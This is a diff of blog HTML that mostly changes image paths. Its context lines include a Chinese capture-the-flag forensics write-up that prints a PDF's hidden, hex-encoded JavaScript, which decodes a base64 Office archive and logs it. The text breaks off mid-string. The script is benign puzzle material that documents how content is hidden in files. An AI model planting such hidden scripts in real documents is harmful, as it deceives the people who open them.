-<p><img src="img/vehicle_Untitled_16.png" alt="SUMMARY OF LITERATURE ON DRIVER IDENTIFICATION OR FINGERPRINTINGS USING ML"></p>
+<p><img src="/img/vehicle_Untitled_16.png" alt="SUMMARY OF LITERATURE ON DRIVER IDENTIFICATION OR FINGERPRINTINGS USING ML"></p>
 <p>SUMMARY OF LITERATURE ON DRIVER IDENTIFICATION OR FINGERPRINTINGS USING ML</p>
-<p><img src="img/vehicle_Untitled_17.png" alt="SUMMARY OF LITERATURE ON ATTACK DETECTION USING ML"></p>
+<p><img src="/img/vehicle_Untitled_17.png" alt="SUMMARY OF LITERATURE ON ATTACK DETECTION USING ML"></p>
 <p>SUMMARY OF LITERATURE ON ATTACK DETECTION USING ML</p>
-<p><img src="img/vehicle_Untitled_18.png" alt="SUMMARY OF LITERATURE ON MISBEHAVIOUR OR INTRUSION DETECTION USING ML"></p>
+<p><img src="/img/vehicle_Untitled_18.png" alt="SUMMARY OF LITERATURE ON MISBEHAVIOUR OR INTRUSION DETECTION USING ML"></p>
 <p>SUMMARY OF LITERATURE ON MISBEHAVIOUR OR INTRUSION DETECTION USING ML</p>
-<p><img src="img/vehicle_Untitled_19.png" alt="SUMMARY OF LITERATURE ON TRUST COMPUTATION USING ML"></p>
+<p><img src="/img/vehicle_Untitled_19.png" alt="SUMMARY OF LITERATURE ON TRUST COMPUTATION USING ML"></p>
 <p>SUMMARY OF LITERATURE ON TRUST COMPUTATION USING ML</p>
-<p><img src="img/vehicle_Untitled_20.png" alt="SUMMARY OF LITERATURE ON PRIVACY PROTECTION USING ML"></p>
+<p><img src="/img/vehicle_Untitled_20.png" alt="SUMMARY OF LITERATURE ON PRIVACY PROTECTION USING ML"></p>
 <p>SUMMARY OF LITERATURE ON PRIVACY PROTECTION USING ML</p>
 <p>貢獻：</p>
 <ul>
@@ -1721,10 +1721,10 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 </li>
 </ul>
 <hr>
-<p><img src="img/vehicle_353785_0.jpg" alt="353785_0.jpg"></p>
-<p><img src="img/vehicle_353788_0.jpg" alt="353788_0.jpg"></p>
-<p><img src="img/vehicle_353787_0.jpg" alt="353787_0.jpg"></p>
-<p><img src="img/vehicle_353786_0.jpg" alt="353786_0.jpg"></p>
+<p><img src="/img/vehicle_353785_0.jpg" alt="353785_0.jpg"></p>
+<p><img src="/img/vehicle_353788_0.jpg" alt="353788_0.jpg"></p>
+<p><img src="/img/vehicle_353787_0.jpg" alt="353787_0.jpg"></p>
+<p><img src="/img/vehicle_353786_0.jpg" alt="353786_0.jpg"></p>
 <p><a target="_blank" rel="noopener" href="https://www.notion.so">https://www.notion.so</a></p>
 
       
@@ -1793,44 +1793,44 @@ DIFFERENT LEVELS OF COMMUNICATIONS"></p>
 <p>幸好有人能諮詢，我也再次的熬夜去複習並找出flag</p>
 <hr>
 <h3 id="MS-Office"><a href="#MS-Office" class="headerlink" title="MS Office"></a><strong>MS Office</strong></h3><p>使用binwalk工具可以看到該文件應該是ppt檔案</p>
-<p><img src="img/hackthonkor.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor.png" alt="Untitled"></p>
 <p>把xlsx副檔名修改成ppt打開文件就能看到裡面的文字</p>
-<p><img src="img/hackthonkor_1.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_1.png" alt="Untitled"></p>
 <hr>
 <h3 id="Confidential"><a href="#Confidential" class="headerlink" title="Confidential"></a><strong>Confidential</strong></h3><p>使用pdftotext找出隱藏在pdf內容中文字，看起來沒料</p>
-<p><img src="img/hackthonkor_2.png" alt="Untitled"></p>
-<p><img src="img/hackthonkor_3.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_2.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_3.png" alt="Untitled"></p>
 <p>不過後來我隊友很快解出來了，然後我就一直去騷擾問他怎麼解的，感謝他的幫助</p>
 <p>there was a hidden javascript encoded code inside it</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/S /JavaScript</span><br><span class="line">/JS &lt;76617220656E636F646564537472203D20225545734442416F4141414141414141414951442F2F2F2F2F73414541414C414241414151414141415733527959584E6F585338774D4441774C6D526864502F2F2F2F3841414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414146424C417751554141594143414141414345414D4235704777454241414378415141414551415A41475276593142796233427A4C324E76636D557565473173494B49564143696741414141414141414141414141414141414141414141414141477951543076454D42544537344C666F655465704F6E71736C7661374D325467714343313543383751616250795278752F767454574F744654774F4D2B2F4876476B50467A30555A2F424257644D6869697455674246574B744E33364F33316F647968496B52754A422B73675135644961414475373170685775453966447372514D66465951696B55786F684F76514B55625845424C45435451504F43564D4D6F2F57617836543944317858487A77486B68645656756949584C4A497963547348514C456331494B52616B2B2F5244426B68425941414E4A675A434D53572F325168656833385073724E4B616857764C7630303131327A706667326C2F516C714355346A694D654E376C47366B2F4A2B39506A533336315647626153674269307A34657A6D72616C573161737061544E302F4F397068576437696D57337866302F307542332B384C50364F7A4C34414141442F2F774D41554573444242514142674149414B4B446446675870546F3470774141415051414141415541414141643239795A4339335A574A545A5852306157356E637935346257794E6A6B454B776A41515266654364776A5A323151584971564E516151585541395130326B6261444A684A68727839415A303438376C352F50666633583764497434414C46463338687455556F42337542672F64544936365862484753723136733656516C755A34677846797A7979484E466A5A786A444A565362475A7750526359774F647552484A397A4A456D68654E6F445A7A513342333471485A6C7556634553782F7A4963383273507A53306A2B30684451455167504D5763517448353772725A63364F324B4931746B58644568487773524151756C612F636A724E31424C417751554141594143414369673352594E416D69644A494141414451414141414567414141486476636D51765A6D397564465268596D786C4C6E68746249324F545172434D42434639344A334B4C4F3371533545536E383234676E30414347643245417A4532616939666747374146635074376A6531383366754A53765645304D5056777242756F6B427850675A3439504F36337777584759622F723174597A5A61334B6E4C5356487561635532754D75686D6A315A6F5455756B385337533552486B61396A3434764C4A3752615273546B317A4E6F4B4C7A65564B353541554E7472364432316C6D5A4B7751395869467063664C3970414D48526D3078752B554573444242514142674149414B4B44644669524475303130514D414144384E4141415241414141643239795A43396B62324E3162575675644335346257793156383175347A59517668666F4F7869364A3549733233474D32497474306978796142456B32374E4255375246725067446B724C69506655564372544841723374412B7862646673514866354973534D3374623374785349314D39393838334649305664766E6C6A5A57784F6C716544544B4431506F683768574F535572366252542B39767A3862526D396D3333317A566B317A6769684675656844423957524E706C46686A4A7A45736359465955696643306B34474A64434D575267716C5978512B70444A632B775942495A7571416C4E5A75346E79536A4B4D43496156517050676B515A3478694A625259476873794563736C785351386D6768315346346665524D6F753479784969567745467758564F6F476A5A324B4269555744636A3674534C5772477A38616E6C49746C79684775526E706164644335564C4A54445247743765654F4D7A596A726F594C59696E6F4F49735A6369746A41416D435A75394D2B4161664A614D5746464C46684C6F5A4E2F54782F73467447557868446C4C597945686E765255456356386B364A53725A6F764E75657236456C4979664C396C4C707236507A5743424A576A6F53667833614E654A72394E7930586251396D762F7233717450363530746B644C68635758314F79725434774265647538642F3942716E4934777A592B44613159396873674742374873514A537755653275756F695A79456D5A745368314F744C4874574136444F4C45657350495539526A65484B33346B4B6852516C497346693957747166644E685178552B486C6274466442446A41696C6A386630356A702F536F3047473857553837674C315477434338366966647147796F364647735758564B6537413033464C495173457244704942376236533651397859314F4B693774647A6C646E496155645A48477079453974394D4D7267674C6B572F7355377166653255665769494D3336316550536B704A772B5637575655475247464E394F6F5037794D5A6C64783632716A6C413965674E4D616C5841783852344C61384F69464B6F784F436758375636376A4238623432416367442F363939653661376E577A6C626B6A516D58424B6B51562B5457714734464E7A595561557A6877507279365A652F66762B35392B666E503737382B70757467794274336D714B3970694B74317A764338487765646E46635558345648356F4A514256704A664369666D614C50712F4C5273796832786D646A6648694A7635496974707473376D6D3653617938724D3058784A7932796563686A643339786173735A543938536473415162563041366E4379464D4677596369334B697646324C667A616475303276416E784776434B33544C544C46524F4D47576F3945766C5454594552673945477A6A6B476B634D793064354A5372642B67615034502B343752316144574463612B7369525574576F6858355468676A6D4D63436B7974326C796A6875533130482B74533145513943495A3453775A712B762B4A772F5839653537766B7436684B566550746F4E7132477A707062326731354D4378714E78466E615264584271724835416476385A4164665A39434A4A3356596D53774F7A7751442B514E694477437230504664305657795A43344A7941766634693252737661313257394E565A647730435752744F702F33783471393330686951786A4137545341584157726459566933796C7174375142662B7535524656704846453468653670775642624E6E4A6B37556E2F434B63552B495755496477747241344E444D33746A7A6359674E3339465A72394456424C4177515541415941434143696733525966594A477450494341414157435141414477414141486476636D5176633352356247567A4C6E6874624D56577A5737554D42432B492F454F55653574647064535164533071725A5556494B79676C616376593533592F4250734C314E32784F76674152484A473438414739466551686D624B65622F514732456F4A544D76376D66373578736E64774B55567977597A6C57685670663775584A6B7852585849314C644C7A732B4F74522B6E422F76313765303175335A56674E6746395A584E4A693752797273367A7A4E4B4B53574B336463305567424E744A4845676D6D6B6D69586B377137656F6C6A5678664D77466431665A6F4E666254614D6273346B58505A6C77796F34306E556D6D6E4C66504442506755537462386471323370704E764458616C4C58526C466B4C4E556F522F456E43316132622F73364B49386D7030565A50334459556B34574D4D6E51463576326566354D69335963326C5A6F6573516D5A435764527245636D696C4843787875614E506B46455555363171344373777A50454C45316F5A415777475469474C536E7639734C654552517959794D4E326D66454D504C6937454137555432756B314F7464436D4455356D5467666E2F746A4876323742515276334F70775037536F7939435861716D77684B6867784D642B71584569796D7736557539516D54793777556F6257516430705350373070437A53305173767536756146576C4E444A6B61556D506A6D6C7752796472777038673948414D4577484F50733076583475676D67484349344C746A7A315A2F6476766535444D2B4D6C7762594774727552554E357769612B385A764E6B3742465873354535432B377A7234785A4D6948547838485073564A6F397532376E476D545738314D31514B32653061504F4A772B6C4361496D2B5834456A6476526B53624F444C4371652F6C4C78314C636C3168687A73582B58483144724D52534731434B57636C366B4E31382F2F506A3850766E2B3763764E78302F49415561734F37536372494771513258586D564337724F77724361484361397759547A447378782F354E3842634176396F4251536B734A30722F4976376C6F786168695A5933622F6A6F325753502B566C795A53767369734371565846532F613659757263737243627930655265762F7A6D74683849672F6D4533466B4C4E6A4B4E4D4A746B4A784673484D6E7A4C65344A662F362F585A6A6755534277592F466B416E786E48674A4C6D326E35533066796B7543716344584A32356C774E464F73416C65506F45336337312B3731456742654B6F5A2F69302B713269562F435A3648714E77786A5936646F50666A46646B4534555874484C61625257486D384E3737775A4F2F4D35714A6B634D775066727A577A534A35786535645632485247585A4C44694C766952707848472F797A4352766A2F33483266774A5153774D4546414147414167416F6F4E30574F62777A663870427741414E683841414255414141423362334A6B4C33526F5A57316C4C33526F5A57316C4D53353462577A7457553976327A595576772F5964784230642F31506B753267626D484C64724F31615976613764416A49394D5747306F304A4471705552515932754F4141634F36595A6342752B307762437651417274306E795A62683630442B68583253466F533554394B326D5348416B6D4152434C663737306648782F664938584C5678384731446A4555557859324461726C79716D67554F506A556B34625A743352344E53307A52696A7349786F697A4562584F4259394F346575586A6A347A4C614966374F4D414761416A6A486451326663356E4F2B56793745457A69692B784751366862384B69414846346A61626C6359534F51484E417937564B78536B486949536D45614941464E2B615449694844616E53764A496F37314F7745504A594E486730476772564F49655173754F44717043494637464C492B4D513062594A647362736149516663744F674B4F6251305459723867636735555259506937686C472F526F6D6B59794A38314455766F2B4B416D655554542F5A53495A646D5730316B69564D6653714A536C66423353622F536476724D4F57636F697A774F664B4B36364A62766236766273645A676D72783433574F7731657658714E716955563944363276673674766A6442705879436D71745151634446795A6B4731544B4B3669394272577352733231746B476C764949366139424770644F7A477475675574366E4A44785941315A73702B3575634649715057463064794F795A567544526D33645A41614167457A6A57786965734A4276692F594150574452414153454945576368415A667A5041456562434F33767A3431622F6666323738382B4B484E382B2B4D59305A436C6B4D7A5A56615A56437077312F7861386D6E7066656B4171454A4930324E346F71523650446974513550726B6842306F6939694D7834322F7755544A6D61344E74585037393939634A342B2B7235385A4F587830392B4F33373639506A4A723071764143616A544258736F6E43714B386950524B365A62546A49535A6B482F767A6C697A392B2F3772594543534644504436322B642F76587A2B2B7273762F2F37705751477345364639485459694159364E6D2F6A49754D4D4347487342513777667652397935434F69497A76684E455968456C594C375057356E3050645843434B437553374F4F2F356578456B7A794C4174666D4433494347666A546E704D444364542F49416659596F313057465872747575436754644E6F486B364C5355567A5866344F516F64466E46775535754B6D50353942645346464A6C776635345A786D364B516F796B4F4D546445487A7641754D414C39776E4A7A6373653853495773776B3337684F6A693069684330646B50786531475869584244432F69794C6945456335582B37644D37714D466E6D6E68772F7A434669646942594D626F52707A763358304A796A6F4D6A45434156556E3741626950744667786775496B2B5837386363496D694B4B54503659787A4852646862456668484336627243424A3159546A7430555751523053634842545A7549455930784539647544364B4A67565959596B3948584D4A2F45424C41316B33476138434C624838697457764D4E386F7644454D4C70486343364D54702F4637704A706A6D6F57674B4A6E48685845786A584D6375746D754B415468484D7045777067727134464A48792F496D646646446C526A71476135756235505974634A794B4671333533706253644A4C3961304677576A636D48583839366142376578724355743238434C73705A6272743455633475796C6D3639542B2F636E5A532F766E2F693168577436436B695A4258787A683533416D326E756B6D684E4968583142384935596E6F7869712B5867416A51496E76366A67394976437A4964486C576E5348706C3363714270684B514349324C384D384C396F59396D63424155353165304D343258647161784D574D786E41396C6336704F66554E4A444D45706378377373624671725662465678526C5837564C6A6F686E456855376C59686C7535434163797058477078473269306146586635615163474A742B6D386E795A6B425061336F57675A6E34627758724B5942504252745A394B6F4C53492B664D7346584973436C4D716A6B6F594167526D4D34303748634E32433233546473434B4942683953474B78327275515249456C4F2B586753506A3544794453486C36475554774353495A5144594475544344665677696B633169466B51744D597754505341636F434C3846454755493668462B5461435147444A49434D592B32694D6B7A466D41724C357845422F317A68715A5547694D6442586F7644686B6D4D32436F316A6F356E31432B5A624B4A34786B45516D58456C774E4E54544851324E6F3762703147304953772F4E32755945506B7642597A43442B497A46575166524B58796739726849664A41527A3577655A31484D65796A323156524A665371596B6735684A6941635277596C51647355666B6F384B5A756C70796773475667356B6E3231426D6E7441366266677254353464455869537358536E6779775237586730747245624F6C586D5839412F436D4E776E4F524664657A3468454F32774F55545830783066475070314864784345754E326F43756550535178487436716169544742473473305757667876314C517865714742614666424D6851566532497A6E7930724C705A7870577461716C724E7849704C396C54344A6A55626271583936646975364B336E4832526E6B61447672466F5A66734F565258424D586F324650754F6C57774959306C3350636F6A656D6F35313032555672757971646A494D366C56676C793666394B79646D737461363973305462557A72574276764D65532B4F6632642F4958777876786338776B71777969724B56394B757173386F2F633142533245376766357253715446774D674F795661346850565132464D364E444B44784C467373674B3875484769614A416346475A4879546C532F4357583744794446396544475A30374633536767567073677354324572364F776E78374B6A585761744E5A6270656A794F4141675978365274766D6F596E6373743261377055725437706573756C55704E65314F766453783758713162316372765737744D6151653767645657393045442B427A4C31307337344E6C2B397164634A42383862376B7361444D354A31765759355033676C58613576756845666930746330434F544A52303574304B7133756B36705665384D536C617632797931584B6462366A6C756F7A666F7558617A4E586873476F6453324F7255586376704E30744F3158564C6C6C4D52394A757455734F71315470576F39507357783078426D43774D676A7055334247386A39786E3652363554395153774D4546414147414167416F6F4E30574330513363646E4177414172676741414245414141423362334A6B4C334E6C64485270626D647A4C6E6874624A3157323237624F4242395832442F7764427A665575546F424469464768634E2B6B6D33514471747338554E624B4A3843494D4B577664722B2B514643306269644F695436466D7A70793538484363712F662F4B7A6E61416C706839434B625432625A434451336C64447252666266313958345866622B2B752B2F72727263676E4E6B74534F4B30445933693678466E56752B4163587357416D4F787072616A626C5275616C727761482F6B2F5552754D67327A6A5835644E6F48545577446D74687167346F354F7A47346E736249706547744175326D5A37505A355252424D6B66313259316F62474A54663870477154614A5A5074614531736C453636627A3135443975313242717439784F2B5535774D614E42797370636B7147647456544F6845592B5876384D5235336F73534765344F534B3770326E34596F305A643367427947696864385779575856394E6F384D444C4E764349384A575150636F754773526776736C4D3947674D5858686D41506974413149475954434A54437175637658794A5269644E505245706947474A2B7567707131306E316C5A65464D51794662526A322B5331556475304F417349316B75317544346F66526A736B6C736F3679666B4A526653546C37684A48333166314B2F7742365464414A2F687079724D3471703779464E6F546176505961707065454F6F2F674A6F71444E322F374F6879766D484975414D734773594A66454F396F5A47706D6370384D65374771415A4A484C474B4578452B65306C436F6A65383945464669326861586430434931756F3454583379384572593669306B38484A54573151696379464770686B6D6B4E4276556A3473484F774E47305A5439394635546152374A65674C6D38747244376573353170695A6545657653644D685A78473947344E464E416567743169464A493458595070674B7678686246732B657A5831515443756E587A54532B3346364C3834742B336F4779547851715363327133432B5252357050504B336F376B624B4B376D6C556D36594B6C477730594E664E4251335944792B784B635051672F6F456D6A395163524633344171326E49416A73654849484A356E46564D7968554A616344524D6F7241766338447659535855496479396D65567977654736384E79776950613233306B6E6F4430396B414F3965654443767969416678454B6D78694A66536F50334D50374A413164376F692F3144762F507938547A703450565A6F64792F55674C4E745753544336504D6F545276764345624B2F33654C4D572F76334E2B42767A45536B4D54432F327242413273615569734A70567A5046356B5536343262653930342B716F59506F5750636E33572B3836436A3736384C337777376E736C64482F776748676B5648385962472B54376531674F302B32383846326B577758672B30793253363962624F6A6655367239346E6B6E593765586873705451665662544975736D636D5035726E512F43444354766E546E505A566B44367167793364396F7665787443586E5037766334466962485971584C5959704F59374D6A6E4D306C685851454E6255426E6B4F6F4F7677467649766A4946784B6E2F7A797566774A5153774D4546414147414167416F6F4E30574472392B702F72414141415A674D41414277414141423362334A6B4C3139795A57787A4C325276593356745A5735304C6E6874624335795A57787A725A4C4C62734D67454558336C666F5061505931647670515651566E4530584B746E552F674F4478513755424D644E482F723749556C7569657547464E306A33416E664F77477833582B4D67506A425137367943497374426F445775376D3272344C553633447A437272792B326A376A6F446D656F6137334A4F496C53776F365A76386B4A5A6B4F5230325A38326A6A5475504371446E4B304571767A5A7475555737792F4547474E41504B693078787242574559313241714D34656C32533770756B4E377031354839487954416C4A794277626F5A697051347573344D664A496D636B6B476C6238304362565948345047434B4D2B6E6C4D4C6472776E7A69366558664179586D637179374E6245615A376E537077482F66753358576F353076795953782F6C4F63435970703757594A3771594B79712F4156424C41775155414159414341436967335259777432507A2B41414141426E4167414143774141414639795A57787A4C7935795A57787A725A444E61674D784449547668623644385433725451716C6C48687A4B595863536B6B66514E6A61585A503442316C4A30376576794B565A5745716750556F6144642F4D656E4F4F423356437169456E7135644E7178556D6C33314967395566753966466B39353039336672647A77416936614F6F56516C54366C6150544B585A324F71477A464362584C424A4A632B557753576B515A54774F3168514C4E7132306444317836366D33697172626561746E367031653672344E2B385455514744777A475A634A464953456A446C6A46484768417474706E39796272656C453051693038356A726B504E377164727A63393848685333624869496C6E476A42345A6B77652F652B41554D727466412F2F7954644E384E50645A795A76704D424C73486D32535A57312B775A5153774D4546414147414167416F6F4E30574976337A4A4278415141413267554141424D41414142625132397564475675644639556558426C6331307565473173745A544C54734D7745455833535078443543314B334C4A41434358706773655356714A38674F4E4D576F4E6A573762372B6E736D53524F685571684D31553255683333757665504A704A4E744C614D315743653079736734475A4549464E656C5549754D764D3966346E737979612B7630766E4F674974777358495A575870764869683166416B3163346B326F50424C7057334E504437614254574D66374946304E7652364935797254776F482F754751664C30435371326B6A353633754C7254726751696B5350336270474B69504D47436B34382B694C726C563549424C7271684963537331584E6149544C57466166414433694B64372F6C456843394B464B65326A4A4C697A64654F57777267627A48744B716C6E7965365A447742515077596F536F686D7A2F70585657414B4B38575A5747306578474D6E66754E4D6C677162614A5A5378515352594C3242493057766E615839333141585846734A7439505672646764726237517471664D37435335632B61424847685A6D352B4163646E63746B343762483255662F5867524F69506750573639684A55394F63444D426F7133692F6E3542672B774E50794F352F62716A364D61794455544B73425268534E6C7A6772356A373439315430444F73434F7834454A744C324F7A2B376E46764E546E4C616A4F76384355457344424251414267414941414141495142307A74497772774541414A454441414151414141415A47396A55484A7663484D76595842774C6E6874624A7854775737624D4179394639672F474C6F33646F4A684B414C61785A426936474846417352747A35704D32384A73535A42596F2B6E586C376151526C6C336D6B2B506A39545449796E44376573345A4250366F4B3070785870566941794E736F303258536B6536782F584E79494C4A45306A423275774645634D347262366367563762783136306867796C6A436846443252322B5A355544324F4D71773462546A54576A394B34744233755731627266444F71706352446557626F766957347975686162433564682B43496970754A2F70663063617132563934716F2B4F4456645157354A447255657343736A504165786C6836466151783442504676664C484545734F756C6C347034507650424A414C75346F4471785773367A716B30684A2F617343717A45664174586E5A65756E34686B776765486E614464677439676E425163734164323639614F5153452F457A41506370354E5875703252464D744A31516B66565A30472B386E4933496673754163394F6C6D4B54583068413350356646594D4744432B5372577450413270794C38514C5473685472722F4F4D754A62425A65464D52672B63754853333342422B746477762F6350734F6A5737654968574533735A38657634354848706D472F375335396E2F5363387574726553634C543643374A5A4A33506D7671446B79727536627A59684963444C7838623375784A37557A4150632F59442F4F56664E5A30324A78715069666775334E5038512B723170745677522F6B43636550372B5070562B38414141442F2F774D41554573424169304143674141414141414141416841502F2F2F2F2B77415141417341454141424141414141414141414141414141414141414141414141467430636D467A614630764D4441774D43356B59585251537745434C5141554141594143414141414345414D4235704777454241414378415141414551414141414141414141414141414141414465415141415A47396A55484A7663484D76593239795A53353462577851537745434C514155414159414341414141434541463655364F4B63414141443041414141464141414141414141414141414141414141416E41774141643239795A4339335A574A545A5852306157356E6379353462577851537745434C5141554141594143414141414345414E416D69644A49414141445141414141456741414141414141414141414141414141414142414141643239795A43396D623235305647466962475575654731735545734241693041464141474141674141414168414A454F37545852417741415077304141424541414141414141414141414141414141417767514141486476636D51765A47396A6457316C626E517565473173554573424169304146414147414167414141416841483243527254794167414146676B4141413841414141414141414141414141414141417767674141486476636D5176633352356247567A4C6E68746246424C415149744142514142674149414141414951446D384D332F4B516341414459664141415641414141414141414141414141414141414F454C4141423362334A6B4C33526F5A57316C4C33526F5A57316C4D53353462577851537745434C5141554141594143414141414345414C524464783263444141437543414141455141414141414141414141414141414141413945774141643239795A43397A5A5852306157356E6379353462577851537745434C5141554141594143414141414345414F7633366E2B73414141426D41774141484141414141414141414141414141414141445446674141643239795A433966636D56736379396B62324E31625756756443353462577775636D56736331424C415149744142514142674149414141414951444333592F5034414141414763434141414C414141414141414141414141414141414150675841414266636D567363793875636D56736331424C415149744142514142674149414141414951434C3938795163514541414E6F4641414154414141414141414141414141414141414141455A414142625132397564475675644639556558426C633130756547317355457342416930414641414741416741414141684148544F306A4376415141416B514D4141424141414141414141414141414141414141416F786F4141475276593142796233427A4C32467763433534625778515377554741414141414177414441442F416741416742774141414141223B0D0A0D0A66756E6374696F6E206261736536344465636F646528737472297B0D0A2020202072657475726E2061746F6228737472293B0D0A7D0D0A0D0A766172206465636F646564537472203D206261736536344465636F646528656E636F646564537472293B0D0A636F6E736F6C652E6C6F67286465636F64656453747229&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="img/hackthonkor_4.png" alt="Untitled"></p>
+<p><img src="/img/hackthonkor_4.png" alt="Untitled"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var encodedStr = <span class="string">&quot;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